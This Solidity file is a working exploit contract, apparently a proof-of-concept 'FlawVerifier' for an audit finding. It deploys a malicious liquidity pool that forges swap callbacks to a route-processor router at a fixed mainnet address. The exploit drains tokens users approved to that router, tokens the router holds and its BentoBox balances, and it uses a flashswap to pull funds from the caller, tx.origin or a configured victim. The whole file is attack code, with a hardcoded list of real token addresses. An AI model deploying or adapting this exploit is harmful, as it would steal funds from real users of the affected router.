// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IRouteProcessor2 {
    function processRoute(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,
        address to,
        bytes calldata route
    ) external payable returns (uint256 amountOut);

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;

    function tridentCLSwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IBentoBoxMinimal {
    function balanceOf(address token, address account) external view returns (uint256);
}

contract MaliciousConcentratedLiquidityPool {
    address internal immutable VERIFIER;
    address internal immutable TARGET_ROUTER;

    address internal forgedToken;
    address internal forgedFrom;
    address internal beneficiary;
    uint256 internal callbackAmount;
    bool internal useTridentCallback;

    constructor(address verifier_, address router_) {
        VERIFIER = verifier_;
        TARGET_ROUTER = router_;
    }

    function configure(
        address token_,
        address from_,
        address beneficiary_,
        bool useTrident_,
        uint256 callbackAmount_
    ) external {
        require(msg.sender == VERIFIER, "not verifier");
        forgedToken = token_;
        forgedFrom = from_;
        beneficiary = beneficiary_;
        useTridentCallback = useTrident_;
        callbackAmount = callbackAmount_;
    }

    function swap(
        address,
        bool,
        int256 amountSpecified,
        uint160,
        bytes calldata
    ) external returns (int256 amount0, int256 amount1) {
        return _swap(amountSpecified);
    }

    function swap(
        address,
        bool,
        int256 amountSpecified,
        uint160,
        bool,
        bytes calldata
    ) external returns (int256 amount0, int256 amount1) {
        return _swap(amountSpecified);
    }

    function _swap(int256 amountSpecified) internal returns (int256 amount0, int256 amount1) {
        require(msg.sender == TARGET_ROUTER, "not router");

        uint256 forgedAmount = callbackAmount;
        if (forgedAmount == 0) {
            require(amountSpecified > 0, "no amount");
            forgedAmount = uint256(amountSpecified);
        }

        // The exploit keeps the finding's original causality:
        // 1. the route points the V3/CL hop at an attacker-controlled pool,
        // 2. the router stores that pool in lastCalledPool,
        // 3. the fake pool forges callback data as (token, victimOrRouter),
        // 4. the router transfers victim-approved or router-held tokens to the fake pool.
        //
        // The forged callback amount is also attacker-chosen. It does not need to match
        // amountSpecified, because the router validates neither the pool code nor the callback deltas.
        bytes memory forgedData = abi.encode(forgedToken, forgedFrom);
        if (useTridentCallback) {
            IRouteProcessor2(TARGET_ROUTER).tridentCLSwapCallback(_toInt256(forgedAmount), 0, forgedData);
        } else {
            IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(_toInt256(forgedAmount), 0, forgedData);
        }

        uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
        if (stolen > 0) {
            _safeTransfer(forgedToken, beneficiary, stolen);
        }

        amount0 = _toInt256(forgedAmount);
        amount1 = -_toInt256(forgedAmount);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _toInt256(uint256 value) internal pure returns (int256) {
        require(value <= uint256(type(int256).max), "too much");
        return int256(value);
    }
}

contract FlawVerifier {
    address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
    address internal constant BENTOBOX = 0xf5Bce5077908a1b7370B9Ae04aDF887A3ecF7ccF;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WETH_DAI_UNIV2_PAIR = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;

    uint8 internal constant COMMAND_PROCESS_MY_ERC20 = 1;
    uint8 internal constant COMMAND_PROCESS_USER_ERC20 = 2;
    uint8 internal constant COMMAND_PROCESS_INSIDE_BENTO = 5;

    uint8 internal constant POOL_UNIV3 = 1;
    uint8 internal constant POOL_BENTO_BRIDGE = 3;
    uint8 internal constant POOL_TRIDENT_CL = 5;

    uint256 internal constant MIN_PROFIT = 1e15;

    address internal immutable POOL;

    address internal storedProfitToken;
    uint256 internal storedProfitAmount;

    address public configuredVictim;
    address public configuredVictimToken;

    address internal flashPair;
    address internal flashToken;
    address internal flashVictim;
    uint256 internal flashBorrowAmount;
    uint256 internal flashRepayAmount;
    uint256 internal flashDrainAmount;
    bool internal flashUseTrident;

    constructor() {
        POOL = address(new MaliciousConcentratedLiquidityPool(address(this), ROUTER));
    }

    function executeOnOpportunity() external {
        if (storedProfitAmount != 0) {
            return;
        }

        if (_drainRouterBalances(false) || _drainRouterBalances(true)) {
            return;
        }

        if (_drainRouterBentoBalances(false) || _drainRouterBentoBalances(true)) {
            return;
        }

        if (_attemptImplicitVictims(msg.sender)) {
            return;
        }

        if (tx.origin != msg.sender && _attemptImplicitVictims(tx.origin)) {
            return;
        }

        if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
            if (_attemptFlashswapVictimDrain(configuredVictim, configuredVictimToken, false)) {
                return;
            }
            if (_attemptFlashswapVictimDrain(configuredVictim, configuredVictimToken, true)) {
                return;
            }

            _attemptDirectVictimDrain(configuredVictim, configuredVictimToken, false);
            if (storedProfitAmount == 0) {
                _attemptDirectVictimDrain(configuredVictim, configuredVictimToken, true);
            }
        }
    }

    function configureVictim(address victim, address token) external {
        configuredVictim = victim;
        configuredVictimToken = token;
    }

    function profitToken() external view returns (address) {
        return storedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return storedProfitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == flashPair, "unknown pair");
        require(sender == address(this), "bad sender");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == flashBorrowAmount, "bad amount");

        // The V2 flashswap is only temporary funding for deterministic repayment.
        // The actual theft still comes from the malicious V3/CL callback primitive.
        MaliciousConcentratedLiquidityPool(POOL).configure(
            flashToken,
            flashVictim,
            address(this),
            flashUseTrident,
            flashDrainAmount
        );

        bytes memory route = _buildVictimRoute(flashToken, flashUseTrident);
        IRouteProcessor2(ROUTER).processRoute(flashToken, flashBorrowAmount, flashToken, 0, address(this), route);

        _safeTransfer(flashToken, flashPair, flashRepayAmount);
    }

    function _attemptImplicitVictims(address victim) internal returns (bool) {
        if (victim == address(0)) {
            return false;
        }

        if (_attemptFlashswapVictimDrain(victim, WETH, false)) {
            return true;
        }
        if (_attemptFlashswapVictimDrain(victim, WETH, true)) {
            return true;
        }
        if (_attemptFlashswapVictimDrain(victim, DAI, false)) {
            return true;
        }
        if (_attemptFlashswapVictimDrain(victim, DAI, true)) {
            return true;
        }

        return false;
    }

    function _drainRouterBalances(bool useTridentCallback) internal returns (bool) {
        for (uint256 i = 0; i < 20; ++i) {
            address token = _routerTokenCandidate(i);
            uint256 routerBalance = _safeBalanceOf(token, ROUTER);
            if (routerBalance <= 1) {
                continue;
            }

            if (_attemptRouterDrain(token, useTridentCallback, routerBalance - 1)) {
                return true;
            }
        }

        return false;
    }

    function _drainRouterBentoBalances(bool useTridentCallback) internal returns (bool) {
        for (uint256 i = 0; i < 8; ++i) {
            address token = _bentoTokenCandidate(i);
            uint256 shares = _safeBentoBalanceOf(token, ROUTER);
            if (shares <= 1) {
                continue;
            }

            if (_attemptRouterBentoDrain(token, useTridentCallback)) {
                return true;
            }
        }

        return false;
    }

    function _attemptRouterDrain(address token, bool useTridentCallback, uint256 callbackAmount) internal returns (bool) {
        uint256 beforeBalance = _safeBalanceOf(token, address(this));
        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback, callbackAmount);

        bytes memory route = _buildRouterHeldRoute(token, useTridentCallback);
        try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
            return _recordProfitIfAny(token, beforeBalance);
        } catch {
            return false;
        }
    }

    function _attemptRouterBentoDrain(address token, bool useTridentCallback) internal returns (bool) {
        uint256 beforeBalance = _safeBalanceOf(token, address(this));
        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback, 0);

        bytes memory route = _buildBentoThenRouterHeldRoute(token, useTridentCallback);
        try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
            return _recordProfitIfAny(token, beforeBalance);
        } catch {
            return false;
        }
    }

    function _attemptFlashswapVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
        if (victim == address(0) || token == address(0)) {
            return false;
        }

        (address pair, uint256 amount0Out, uint256 amount1Out) = _pairAndBorrowDirection(token);
        if (pair == address(0)) {
            return false;
        }

        uint256 allowance = _safeAllowance(token, victim, ROUTER);
        uint256 balance = _safeBalanceOf(token, victim);
        uint256 drainAmount = _min(allowance, balance);
        if (drainAmount <= MIN_PROFIT) {
            return false;
        }

        uint256 borrowAmount = 1;
        uint256 repayAmount = _sameTokenFlashRepay(borrowAmount);
        uint256 desiredDrain = repayAmount + MIN_PROFIT;
        if (drainAmount < desiredDrain) {
            return false;
        }

        uint256 beforeBalance = _safeBalanceOf(token, address(this));
        flashPair = pair;
        flashToken = token;
        flashVictim = victim;
        flashBorrowAmount = borrowAmount;
        flashRepayAmount = repayAmount;
        flashDrainAmount = desiredDrain;
        flashUseTrident = useTridentCallback;

        try IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), hex"01") {
            _clearFlashState();
            return _recordProfitIfAny(token, beforeBalance);
        } catch {
            _clearFlashState();
            return false;
        }
    }

    function _attemptDirectVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
        uint256 allowance = _safeAllowance(token, victim, ROUTER);
        uint256 balance = _safeBalanceOf(token, victim);
        uint256 amountToPull = _min(allowance, balance);
        if (amountToPull <= MIN_PROFIT) {
            return false;
        }

        uint256 beforeBalance = _safeBalanceOf(token, address(this));
        MaliciousConcentratedLiquidityPool(POOL).configure(token, victim, address(this), useTridentCallback, MIN_PROFIT + 1);

        bytes memory route = _buildVictimRoute(token, useTridentCallback);
        try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
            return _recordProfitIfAny(token, beforeBalance);
        } catch {
            return false;
        }
    }

    function _recordProfitIfAny(address token, uint256 beforeBalance) internal returns (bool) {
        uint256 afterBalance = _safeBalanceOf(token, address(this));
        if (afterBalance > beforeBalance) {
            storedProfitToken = token;
            storedProfitAmount = afterBalance - beforeBalance;
            return true;
        }

        return false;
    }

    function _buildRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
        return bytes.concat(
            abi.encodePacked(
            uint8(COMMAND_PROCESS_MY_ERC20),
            token,
            uint8(1),
            uint16(65535)
            ),
            abi.encodePacked(
            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
            POOL,
            uint8(1),
            address(this)
            )
        );
    }

    function _buildVictimRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
        return bytes.concat(
            abi.encodePacked(
            uint8(COMMAND_PROCESS_USER_ERC20),
            token,
            uint8(1),
            uint16(65535)
            ),
            abi.encodePacked(
            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
            POOL,
            uint8(1),
            address(this)
            )
        );
    }

    function _buildBentoThenRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
        bytes memory first = abi.encodePacked(
            uint8(COMMAND_PROCESS_INSIDE_BENTO),
            token,
            uint8(1),
            uint16(65535)
        );
        bytes memory second = abi.encodePacked(
            uint8(POOL_BENTO_BRIDGE),
            uint8(0),
            ROUTER
        );
        bytes memory third = abi.encodePacked(
            uint8(COMMAND_PROCESS_MY_ERC20),
            token,
            uint8(1),
            uint16(65535)
        );
        bytes memory fourth = abi.encodePacked(
            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
            POOL,
            uint8(1),
            address(this)
        );
        return bytes.concat(first, second, third, fourth);
    }

    function _pairAndBorrowDirection(address token) internal pure returns (address pair, uint256 amount0Out, uint256 amount1Out) {
        if (token == DAI) {
            return (WETH_DAI_UNIV2_PAIR, 1, 0);
        }
        if (token == WETH) {
            return (WETH_DAI_UNIV2_PAIR, 0, 1);
        }
        return (address(0), 0, 0);
    }

    function _sameTokenFlashRepay(uint256 borrowAmount) internal pure returns (uint256) {
        unchecked {
        return ((borrowAmount * 1000) / 997) + 1;
        }
    }

    function _routerTokenCandidate(uint256 index) internal pure returns (address) {
        if (index == 0) return 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        if (index == 1) return 0xdAC17F958D2ee523a2206206994597C13D831ec7;
        if (index == 2) return 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        if (index == 3) return 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        if (index == 4) return 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
        if (index == 5) return 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
        if (index == 6) return 0x514910771AF9Ca656af840dff83E8264EcF986CA;
        if (index == 7) return 0xD533a949740bb3306d119CC777fa900bA034cd52;
        if (index == 8) return 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
        if (index == 9) return 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
        if (index == 10) return 0xc00e94Cb662C3520282E6f5717214004A7f26888;
        if (index == 11) return 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
        if (index == 12) return 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
        if (index == 13) return 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
        if (index == 14) return 0x111111111117dC0aa78b770fA6A738034120C302;
        if (index == 15) return 0x0D8775F648430679A709E98d2b0Cb6250d2887EF;
        if (index == 16) return 0xE41d2489571d322189246DaFA5ebDe1F4699F498;
        if (index == 17) return 0x0000000000085d4780B73119b644AE5ecd22b376;
        if (index == 18) return 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
        return 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
    }

    function _bentoTokenCandidate(uint256 index) internal pure returns (address) {
        if (index == 0) return DAI;
        if (index == 1) return WETH;
        if (index == 2) return 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        if (index == 3) return 0xdAC17F958D2ee523a2206206994597C13D831ec7;
        if (index == 4) return 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
        if (index == 5) return 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
        if (index == 6) return 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
        return 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 value) {
        if (token.code.length == 0) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20.balanceOf.selector, account)
        );
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeAllowance(address token, address owner, address spender) internal view returns (uint256 value) {
        if (token.code.length == 0) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20.allowance.selector, owner, spender)
        );
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeBentoBalanceOf(address token, address account) internal view returns (uint256 value) {
        if (BENTOBOX.code.length == 0) {
            return 0;
        }

        (bool ok, bytes memory data) = BENTOBOX.staticcall(
            abi.encodeWithSelector(IBentoBoxMinimal.balanceOf.selector, token, account)
        );
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _clearFlashState() internal {
        flashPair = address(0);
        flashToken = address(0);
        flashVictim = address(0);
        flashBorrowAmount = 0;
        flashRepayAmount = 0;
        flashDrainAmount = 0;
        flashUseTrident = false;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
